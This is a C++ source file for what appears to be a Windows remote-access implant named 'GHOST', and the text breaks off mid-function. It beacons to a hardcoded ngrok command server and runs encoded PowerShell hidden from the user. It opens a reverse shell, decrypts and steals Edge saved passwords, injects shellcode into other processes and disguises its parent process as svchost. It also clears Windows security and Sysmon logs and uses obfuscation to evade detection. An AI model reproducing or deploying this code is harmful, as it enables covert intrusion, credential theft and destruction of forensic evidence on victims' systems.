// c2.cpp — GHOST C2 beacon loop and command dispatcher
#include "c2.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "keylog.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <fstream>
#include <stdio.h>
#include <random>
#include <wincrypt.h>

// ─── No pragma – linked via build.sh ──────────────────────────────────────

namespace config {
    static wchar_t s_BeaconToken[65] = {};
    static wchar_t s_UserAgent[32]   = {};
    static bool    s_ConfigInit      = false;

    static void EnsureInit() {
        if (s_ConfigInit) return;
        auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
        auto ua  = XSW(L"Microsoft-WNS/10.0");
        wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
        wcsncpy_s(s_UserAgent,   ua.str(),  _TRUNCATE);
        s_ConfigInit = true;
    }

    const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
    const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }
    const uint16_t C2_PORT = 443;
}

static std::wstring g_SessionId;
static std::vector<BYTE> g_SessionKey;
static HANDLE g_StolenToken    = NULL;  // primary token from steal_token
static DWORD  g_BeaconOverride = 0;    // seconds; 0 = use config defaults

// Derive 32-byte key as SHA-256(sessionId)
static std::vector<BYTE> DeriveKeyFromSessionId(const std::wstring& sessionId) {
    std::string utf8 = WStringToUTF8(sessionId);
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::vector<BYTE> result(32, 0);
    if (!CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return result;
    if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptHashData(hHash, reinterpret_cast<const BYTE*>(utf8.data()), static_cast<DWORD>(utf8.size()), 0);
        DWORD len = 32;
        CryptGetHashParam(hHash, HP_HASHVAL, result.data(), &len, 0);
        CryptDestroyHash(hHash);
    }
    CryptReleaseContext(hProv, 0);
    return result;
}

// ─── No globals for Telegram credentials – they are embedded via XSW inside functions ───

// =====================================================================
//  DEBUG LOGGING
// =====================================================================
#ifdef DEBUG
static void DebugLog(const wchar_t* msg) {
    OutputDebugStringW(L"[C2] ");
    OutputDebugStringW(msg);
    OutputDebugStringW(L"\n");
    char narrow[1024];
    int n = WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow) - 3, nullptr, nullptr);
    if (n > 0) {
        narrow[n - 1] = '\r'; narrow[n] = '\n'; narrow[n + 1] = '\0';
        HANDLE hf = CreateFileA("C:\\Users\\Public\\g_dbg.log",
            FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD w; WriteFile(hf, narrow, n + 1, &w, NULL);
            CloseHandle(hf);
        }
    }
}
static void DebugLog(const std::wstring& msg) { DebugLog(msg.c_str()); }
#else
static void DebugLog(const wchar_t*) {}
static void DebugLog(const std::wstring&) {}
#endif

// =====================================================================
//  JSON HELPERS
// =====================================================================
static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += static_cast<char>(c);
                }
        }
    }
    return out;
}

static std::string JsonGetString(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return {};
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return {};
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return {};
    size_t start = pos + 1, end = start;
    while (end < json.size()) {
        if (json[end] == '\\') { end += 2; continue; }
        if (json[end] == '"') break;
        ++end;
    }
    std::string raw = json.substr(start, end - start);
    std::string result;
    result.reserve(raw.size());
    for (size_t i = 0; i < raw.size(); ++i) {
        if (raw[i] == '\\' && i + 1 < raw.size()) {
            switch (raw[++i]) {
                case '"':  result += '"';  break;
                case '\\': result += '\\'; break;
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                default:   result += raw[i]; break;
            }
        } else {
            result += raw[i];
        }
    }
    return result;
}

// =====================================================================
//  WINHTTP TRANSPORT (RAII)
// =====================================================================
struct WinHttpHandles {
    HINTERNET session = nullptr, connect = nullptr, request = nullptr;
    ~WinHttpHandles() {
        static HMODULE hW = []() -> HMODULE {
            HMODULE m = GetModuleHandleA(XS("winhttp.dll"));
            return m ? m : LoadLibraryA(XS("winhttp.dll"));
        }();
        if (!hW) return;
        auto _Close = HASHPROC(hW, WinHttpCloseHandle);
        if (_Close) {
            if (request) _Close(request);
            if (connect) _Close(connect);
            if (session) _Close(session);
        }
    }
};

struct HttpResponse { DWORD status = 0; std::string body; };

static HttpResponse WinHttpRequest(
    const std::wstring& host, INTERNET_PORT port,
    const std::wstring& verb, const std::wstring& path,
    const std::string& body, const std::wstring& extraHeaders = L"")
{
    HttpResponse resp;
    static HMODULE hW = LoadLibraryA(XS("winhttp.dll"));
    if (!hW) { DebugLog(L"Failed to load winhttp.dll"); return resp; }

    auto _Open          = HASHPROC(hW, WinHttpOpen);
    auto _Connect       = HASHPROC(hW, WinHttpConnect);
    auto _OpenRequest   = HASHPROC(hW, WinHttpOpenRequest);
    auto _SetOption     = HASHPROC(hW, WinHttpSetOption);
    auto _AddHeaders    = HASHPROC(hW, WinHttpAddRequestHeaders);
    auto _SendRequest   = HASHPROC(hW, WinHttpSendRequest);
    auto _ReceiveResp   = HASHPROC(hW, WinHttpReceiveResponse);
    auto _QueryHeaders  = HASHPROC(hW, WinHttpQueryHeaders);
    auto _QueryAvail    = HASHPROC(hW, WinHttpQueryDataAvailable);
    auto _ReadData      = HASHPROC(hW, WinHttpReadData);

    if (!_Open || !_Connect || !_OpenRequest) {
        DebugLog(L"Failed to resolve WinHTTP functions");
        return resp;
    }

    WinHttpHandles h;
    // Try automatic proxy first (respects system/IE proxy settings)
    h.session = _Open(config::GetUserAgent(),
                      WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!h.session) {
        // Fallback: direct connect
        h.session = _Open(config::GetUserAgent(),
                          WINHTTP_ACCESS_TYPE_NO_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    }
    if (!h.session) {
        DebugLog(L"WinHttpOpen failed");
        return resp;
    }

    DWORD timeout = 45000;
    if (_SetOption) {
        _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_RESOLVE_TIMEOUT, &timeout, sizeof(timeout));
    }

    h.connect = _Connect(h.session, host.c_str(), port, 0);
    if (!h.connect) {
        DebugLog(L"WinHttpConnect failed");
        return resp;
    }

    h.request = _OpenRequest(h.connect, verb.c_str(), path.c_str(), nullptr,
                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE);
    if (!h.request) {
        DebugLog(L"WinHttpOpenRequest failed");
        return resp;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (_SetOption) _SetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    auto ctHdr = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
    auto ngrokHdr = XSW(L"\r\nngrok-skip-browser-warning: true");
    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + ngrokHdr.str() + L"\r\n";
    if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
    if (_AddHeaders)
        _AddHeaders(h.request, hdrs.c_str(),
                    static_cast<DWORD>(hdrs.size()), WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = _SendRequest(h.request,
                             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             body.empty() ? WINHTTP_NO_REQUEST_DATA
                                          : const_cast<char*>(body.data()),
                             static_cast<DWORD>(body.size()),
                             static_cast<DWORD>(body.size()), 0);
    if (!sent || !_ReceiveResp(h.request, nullptr)) {
        DebugLog(L"WinHttpSendRequest or ReceiveResponse failed");
        return resp;
    }

    DWORD statusSize = sizeof(resp.status);
    if (_QueryHeaders)
        _QueryHeaders(h.request,
                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                      WINHTTP_HEADER_NAME_BY_INDEX,
                      &resp.status, &statusSize, WINHTTP_NO_HEADER_INDEX);

    DebugLog(L"Status: " + std::to_wstring(resp.status));

    DWORD avail = 0;
    while (_QueryAvail && _QueryAvail(h.request, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD rd = 0;
        if (_ReadData && _ReadData(h.request, buf.data(), avail, &rd) && rd > 0)
            resp.body.append(buf.data(), rd);
        if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
    }
    return resp;
}

// =====================================================================
//  GENERIC HTTP/HTTPS GET (for download command — no beacon token header)
// =====================================================================
static HttpResponse WinHttpDownload(const std::wstring& url) {
    HttpResponse resp;
    static HMODULE hW = []() -> HMODULE {
        HMODULE m = GetModuleHandleA(XS("winhttp.dll"));
        return m ? m : LoadLibraryA(XS("winhttp.dll"));
    }();
    if (!hW) return resp;

    auto _CrackUrl    = HASHPROC(hW, WinHttpCrackUrl);
    auto _Open        = HASHPROC(hW, WinHttpOpen);
    auto _Connect     = HASHPROC(hW, WinHttpConnect);
    auto _OpenRequest = HASHPROC(hW, WinHttpOpenRequest);
    auto _SetOption   = HASHPROC(hW, WinHttpSetOption);
    auto _SendRequest = HASHPROC(hW, WinHttpSendRequest);
    auto _ReceiveResp = HASHPROC(hW, WinHttpReceiveResponse);
    auto _QueryAvail  = HASHPROC(hW, WinHttpQueryDataAvailable);
    auto _ReadData    = HASHPROC(hW, WinHttpReadData);
    auto _Close       = HASHPROC(hW, WinHttpCloseHandle);

    if (!_CrackUrl || !_Open || !_Connect || !_OpenRequest || !_Close) return resp;

    wchar_t host[512] = {}, path[2048] = {};
    URL_COMPONENTS uc = {};
    uc.dwStructSize    = sizeof(uc);
    uc.lpszHostName    = host; uc.dwHostNameLength = 512;
    uc.lpszUrlPath     = path; uc.dwUrlPathLength  = 2048;
    if (!_CrackUrl(url.c_str(), 0, 0, &uc)) return resp;

    bool secure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    HINTERNET hSes = _Open(config::GetUserAgent(),
                           WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) return resp;

    DWORD timeout = 45000;
    if (_SetOption) {
        _SetOption(hSes, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(hSes, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    }

    HINTERNET hCon = _Connect(hSes, host, uc.nPort, 0);
    if (!hCon) { _Close(hSes); return resp; }

    HINTERNET hReq = _OpenRequest(hCon, L"GET", path, nullptr,
                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  secure ? WINHTTP_FLAG_SECURE : 0);
    if (!hReq) { _Close(hCon); _Close(hSes); return resp; }

    if (secure && _SetOption) {
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        _SetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
    }

    if (!_SendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                      WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !_ReceiveResp(hReq, nullptr)) {
        _Close(hReq); _Close(hCon); _Close(hSes);
        return resp;
    }

    DWORD statusSz = sizeof(resp.status);
    auto _QueryHdrs = HASHPROC(hW, WinHttpQueryHeaders);
    if (_QueryHdrs)
        _QueryHdrs(hReq,
                   WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                   WINHTTP_HEADER_NAME_BY_INDEX,
                   &resp.status, &statusSz, WINHTTP_NO_HEADER_INDEX);

    DWORD avail = 0;
    while (_QueryAvail && _QueryAvail(hReq, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD rd = 0;
        if (_ReadData && _ReadData(hReq, buf.data(), avail, &rd) && rd > 0)
            resp.body.append(buf.data(), rd);
        if (resp.body.size() > 64u * 1024 * 1024) break; // 64 MB cap
    }

    _Close(hReq); _Close(hCon); _Close(hSes);
    return resp;
}

// =====================================================================
//  C2 HOST
// =====================================================================
static std::wstring GetC2Host() {
    static wchar_t host[64] = {};
    if (host[0] == L'\0') {
        auto s = XSW(L"mute-attempt-fossil.ngrok-free.dev");
        wcsncpy_s(host, s.str(), _TRUNCATE);
    }
    return std::wstring(host);
}

// =====================================================================
//  BEACON JSON BUILDER
// =====================================================================
static std::string BuildBeaconJson(const Session& s) {
    std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
    std::string host = JsonEscape(WStringToUTF8(s.hostname));
    std::string user = JsonEscape(WStringToUTF8(s.username));
    std::ostringstream j;
    j << "{"
      << "\"session\":\""  << sid  << "\","
      << "\"recon\":{"
      <<   "\"hostname\":\"" << host << "\","
      <<   "\"user\":\""     << user << "\","
      <<   "\"build\":"      << s.build << ","
      <<   "\"elevated\":"   << (s.elevated    ? "true" : "false") << ","
      <<   "\"amsi\":"       << (s.amsiPatched ? "true" : "false") << ","
      <<   "\"etw\":"        << (s.etwPatched  ? "true" : "false") << ","
      <<   "\"hwbps\":"      << (s.hwbpsCleared? "true" : "false")
      << "}}";
    return j.str();
}

// =====================================================================
//  SEND BEACON (encrypted)
// =====================================================================
BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
    taskOut = L"sleep";
    std::string body = BuildBeaconJson(session);

    DebugLog(L"Sending beacon to " + GetC2Host());
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/beacon", body, L"");

    if (resp.status != 200) {
        DebugLog(L"Beacon failed: HTTP " + std::to_wstring(resp.status));
        return FALSE;
    }

    std::string cmd = JsonGetString(resp.body, "cmd");
    if (!cmd.empty()) {
        taskOut = UTF8ToWString(cmd);
        DebugLog(L"Task received: " + taskOut);
    }
    return TRUE;
}

// =====================================================================
//  SEND RESULT (encrypted)
// =====================================================================
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
    std::string sid = JsonEscape(WStringToUTF8(sessionId));
    std::string out = JsonEscape(WStringToUTF8(output));
    std::string body = "{\"session\":\"" + sid + "\",\"output\":\"" + out + "\"}";
    DebugLog(L"Sending result " + std::to_wstring(output.size()) + L" chars");
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/result", body, L"");
    return (resp.status == 200);
}

// =====================================================================
//  FILELESS POWERSHELL EXECUTOR
// =====================================================================
static std::wstring RunFilelessPS(const std::string& b64Command) {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring ps = std::wstring(sysRoot) +
                      L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    std::wstring cmdLine = L"\"" + ps + L"\" -NoProfile -NonInteractive "
                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
                           L"-EncodedCommand " + UTF8ToWString(b64Command);
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);
    if (!ok) {
        CloseHandle(hRead);
        return L"[error: CreateProcess failed]";
    }

    std::string output;
    output.reserve(4096);
    char buf[4096];
    DWORD bytesRead = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
            break;
        output.append(buf, bytesRead);
    }
    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT)
        TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return UTF8ToWString(output);
}

// =====================================================================
//  CLIPBOARD — read or write system clipboard
// =====================================================================
static std::wstring HandleClipboard(const std::string& args) {
    if (args.empty()) {
        // Read clipboard
        if (!OpenClipboard(nullptr)) return L"[error: OpenClipboard]";
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (!hData) { CloseClipboard(); return L"[clipboard: empty or non-text]"; }
        auto* p = static_cast<wchar_t*>(GlobalLock(hData));
        std::wstring out = p ? std::wstring(p) : L"[clipboard: lock failed]";
        GlobalUnlock(hData);
        CloseClipboard();
        return out;
    }
    // Write to clipboard
    std::wstring wText = UTF8ToWString(args);
    SIZE_T bytes = (wText.size() + 1) * sizeof(wchar_t);
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, bytes);
    if (!hMem) return L"[error: GlobalAlloc]";
    memcpy(GlobalLock(hMem), wText.c_str(), bytes);
    GlobalUnlock(hMem);
    if (!OpenClipboard(nullptr)) { GlobalFree(hMem); return L"[error: OpenClipboard]"; }
    EmptyClipboard();
    SetClipboardData(CF_UNICODETEXT, hMem);
    CloseClipboard();
    return L"[+] Clipboard set (" + std::to_wstring(wText.size()) + L" chars)";
}

// =====================================================================
//  REVERSE SHELL — built from parts at runtime, no static b64 blob
// =====================================================================
static std::wstring HandleReverse(const std::string& args) {
    if (args.empty()) return L"Usage: !reverse IP[:PORT] (default port 443)";
    std::string ip, port = "443";
    size_t colon = args.find(':');
    if (colon == std::string::npos) {
        ip = args;
    } else {
        ip = args.substr(0, colon);
        port = args.substr(colon + 1);
    }

    // Build PS script from XSW parts — no complete script literal in binary
    auto p1  = XSW(L"$c=New-Object System.Net.Sockets.TcpClient('");
    auto p2  = XSW(L"',");
    auto p3  = XSW(L");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};");
    auto p4  = XSW(L"while(($i=$s.Read($b,0,$b.Length)) -ne 0){");
    auto p5  = XSW(L"$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);");
    auto p6  = XSW(L"$sb=(iex $d 2>&1 | Out-String);");
    auto p7  = XSW(L"$sb2=$sb+'PS '+(pwd).Path+'> ';");
    auto p8  = XSW(L"$sbt=([text.encoding]::ASCII).GetBytes($sb2);");
    auto p9  = XSW(L"$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()");

    std::wstring wScript = std::wstring(p1.str()) + UTF8ToWString(ip)
                         + p2.str() + UTF8ToWString(port)
                         + p3.str() + p4.str() + p5.str()
                         + p6.str() + p7.str() + p8.str() + p9.str();

    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()),
                                   wScript.size() * sizeof(wchar_t));
    RunFilelessPS(b64);
    return L"[*] Reverse shell launched to " + UTF8ToWString(ip) + L":" + UTF8ToWString(port);
}

// =====================================================================
//  BROWSER CREDENTIALS — script built from XSW parts, no static b64 blob
// =====================================================================
static std::wstring HandleBrowser(const std::string& /*args*/) {
    // Query Edge Login Data via SQLite-backed Csharp provider
    auto p1 = XSW(L"$r=@\n\"select username_value, password_value from logins\"@\n;");
    auto p2 = XSW(L"$path=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data\";");
    auto p3 = XSW(L"$creds='';");
    auto p4 = XSW(L"if(Test-Path $path){");
    auto p5 = XSW(L"$tmp=[System.IO.Path]::GetTempFileName();");
    auto p6 = XSW(L"Copy-Item $path $tmp -Force;");
    auto p7 = XSW(L"Add-Type -AssemblyName System.Data;");
    auto p8 = XSW(L"$cn=New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$tmp;Version=3;\");");
    auto p9 = XSW(L"try{$cn.Open();$cmd=$cn.CreateCommand();");
    auto pa = XSW(L"$cmd.CommandText='SELECT origin_url,username_value,password_value FROM logins';");
    auto pb = XSW(L"$rd=$cmd.ExecuteReader();");
    auto pc = XSW(L"while($rd.Read()){$url=$rd[0];$user=$rd[1];");
    auto pd = XSW(L"$enc=[byte[]]$rd[2];");
    auto pe = XSW(L"$dec=[System.Security.Cryptography.ProtectedData]::Unprotect($enc,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);");
    auto pf = XSW(L"$pw=[System.Text.Encoding]::UTF8.GetString($dec);");
    auto pg = XSW(L"$creds+=\"$url | $user | $pw`n\"}}catch{}finally{$cn.Close();Remove-Item $tmp -Force}};$creds");

    std::wstring wScript = std::wstring(p1.str()) + p2.str() + p3.str() + p4.str()
                         + p5.str() + p6.str() + p7.str() + p8.str() + p9.str()
                         + pa.str() + pb.str() + pc.str() + pd.str() + pe.str()
                         + pf.str() + pg.str();

    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()),
                                   wScript.size() * sizeof(wchar_t));
    std::wstring result = RunFilelessPS(b64);
    return L"Browser data:\n" + result;
}


// =====================================================================
//  STUB HANDLERS
// =====================================================================
// Set to non-zero to signal BeaconLoop to exit cleanly after migrate.
static volatile DWORD g_MigrateExit = 0;

static std::wstring HandleMigrate(const std::string& args) {
    DWORD svchostPid = args.empty() ? FindBestSvchost()
                                    : static_cast<DWORD>(atol(args.c_str()));
    if (!svchostPid) return L"[error: no svchost pid found]";

    wchar_t selfPath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);

    // Set sentinel so the child skips TryRespawnUnderSvchost and also
    // skips the mutex check (we'll release it when WinMain exits after 0xDEAD).
    SetEnvironmentVariableW(L"__GHOST_SPAWNED", L"1");
    HANDLE hChild = nullptr, hThread = nullptr;
    if (!SpawnWithPPID(selfPath, svchostPid, &hChild, &hThread)) {
        SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr);
        return L"[error: SpawnWithPPID failed (pid=" + std::to_wstring(svchostPid) + L")]";
    }
    SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr);

    ResumeThread(hThread);
    DWORD childPid = GetProcessId(hChild);
    CloseHandle(hThread);
    CloseHandle(hChild);

    // Signal beacon loop to exit — WinMain exits → mutex released → child acquires it.
    g_MigrateExit = 1;

    return L"[+] Migrated → svchost pid=" + std::to_wstring(svchostPid)
         + L" child pid=" + std::to_wstring(childPid) + L" (this instance exiting)";
}

static std::wstring HandleInject(const std::string& args) {
    // args: "<pid> <hex shellcode bytes space-separated>"
    size_t sp = args.find(' ');
    if (sp == std::string::npos) return L"Usage: !inject <pid> <hex bytes...>";
    DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
    if (!pid) return L"[error: invalid pid]";
    std::string hexStr = args.substr(sp + 1);
    std::vector<BYTE> sc;
    for (size_t i = 0; i + 1 < hexStr.size(); i += 2) {
        if (hexStr[i] == ' ') { --i; continue; }
        sc.push_back(static_cast<BYTE>(strtol(hexStr.substr(i, 2).c_str(), nullptr, 16)));
    }
    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
    BOOL ok = InjectRemoteProcess(pid, sc.data(), sc.size(), nullptr);
    return ok ? L"[+] Injected " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
              : L"[error: injection failed]";
}

static std::wstring HandleInjectApc(const std::string& args) {
    size_t sp = args.find(' ');
    if (sp == std::string::npos) return L"Usage: !inject-apc <pid> <hex bytes...>";
    DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
    if (!pid) return L"[error: invalid pid]";
    std::string hexStr = args.substr(sp + 1);
    std::vector<BYTE> sc;
    for (size_t i = 0; i + 1 < hexStr.size(); i += 2) {
        if (hexStr[i] == ' ') { --i; continue; }
        sc.push_back(static_cast<BYTE>(strtol(hexStr.substr(i, 2).c_str(), nullptr, 16)));
    }
    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
    BOOL ok = InjectViaApc(pid, sc.data(), sc.size());
    return ok ? L"[+] APC queued " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
              : L"[error: APC injection failed]";
}

static std::wstring HandlePs(const std::string& /*args*/) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return L"[error: snapshot failed]";
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    std::wstring out = L"PID      PPID     NAME\n";
    out += L"-------- -------- ------------------------\n";
    if (Process32FirstW(snap, &pe)) {
        do {
            wchar_t line[256];
            swprintf_s(line, L"%-8lu %-8lu %s\n",
                       pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
            out += line;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return out;
}
static std::wstring HandleLol(const std::string& /*args*/)     { return L"[lol: not implemented]"; }
static std::wstring HandleExfil(const std::string& /*args*/)   { return L"[exfil: not implemented]"; }
static std::wstring HandleWipe(const std::string& /*args*/) {
    static const wchar_t* kLogs[] = {
        L"System", L"Security", L"Application",
        L"Microsoft-Windows-PowerShell/Operational",
        L"Microsoft-Windows-Sysmon/Operational",
        nullptr
    };
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring wevtutil = std::wstring(sysRoot) + L"\\System32\\wevtutil.exe";
    std::wstring out;
    for (int i = 0; kLogs[i]; ++i) {
        std::wstring cmd = L"\"" + wevtutil + L"\" cl \"" + std::wstring(kLogs[i]) + L"\"";
        STARTUPINFOW si = {};
        PROCESS_INFORMATION pi = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            DWORD exitCode = 1;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            out += std::wstring(kLogs[i]) + (exitCode == 0 ? L": cleared\n" : L": failed (access denied?)\n");
        } else {
            out += std::wstring(kLogs[i]) + L": spawn failed\n";
        }
    }
    return L"[+] Log wipe complete:\n" + out;
}
static std::wstring HandleLateral(const std::string& /*args*/) { return L"[lateral: not implemented]"; }
static std::wstring HandleCreds(const std::string& /*args*/)   { return L"[creds: not implemented]"; }
static std::wstring HandleDownload(const std::string& args) {
    size_t sp = args.find(' ');
    if (sp == std::string::npos) return L"Usage: download <url> <dest>";
    std::string url  = args.substr(0, sp);
    std::string dest = args.substr(sp + 1);
    while (!dest.empty() && dest.front() == ' ') dest.erase(0, 1);
    if (url.empty() || dest.empty()) return L"Usage: download <url> <dest>";

    HttpResponse r = WinHttpDownload(UTF8ToWString(url));
    if (r.status == 0) return L"[error: request failed]";
    if (r.status != 200) return L"[error: HTTP " + std::to_wstring(r.status) + L"]";

    std::wstring wDest = UTF8ToWString(dest);
    HANDLE hf = CreateFileW(wDest.c_str(), GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE)
        return L"[error: cannot write " + wDest + L"]";
    DWORD wr = 0;
    WriteFile(hf, r.body.data(), static_cast<DWORD>(r.body.size()), &wr, nullptr);
    CloseHandle(hf);
    return L"[+] Downloaded " + std::to_wstring(wr) + L" bytes → " + wDest;
}

static std::wstring HandleUpload(const std::string& args) {
    if (args.empty()) return L"Usage: upload <path>";
    std::wstring wPath = UTF8ToWString(args);
    HANDLE hf = CreateFileW(wPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
